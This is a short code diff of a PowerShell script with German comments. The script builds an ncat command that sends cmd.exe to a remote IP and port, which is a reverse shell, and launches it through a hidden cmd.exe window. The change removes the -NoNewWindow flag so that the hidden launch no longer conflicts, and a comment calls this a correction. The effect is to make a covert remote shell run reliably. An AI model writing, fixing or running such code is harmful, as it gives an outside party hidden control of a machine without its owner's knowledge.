@@ -20,5 +20,5 @@ if (-not (Get-Command $ncat_path -ErrorAction SilentlyContinue)) {
 $cmd_command = "$ncat_path $ip $port -e cmd.exe"
 
 # Führe den ncat-Befehl über cmd.exe aus, versteckt und nicht interaktiv.
-# Dies startet cmd.exe und lässt es den ncat-Befehl ausführen, der dann die Shell sendet.
-Start-Process cmd.exe -WindowStyle Hidden -ArgumentList "/c", $cmd_command -NoNewWindow
+# Korrektur: -NoNewWindow entfernt, da es mit -WindowStyle Hidden in Konflikt steht.
+Start-Process cmd.exe -WindowStyle Hidden -ArgumentList "/c", $cmd_command
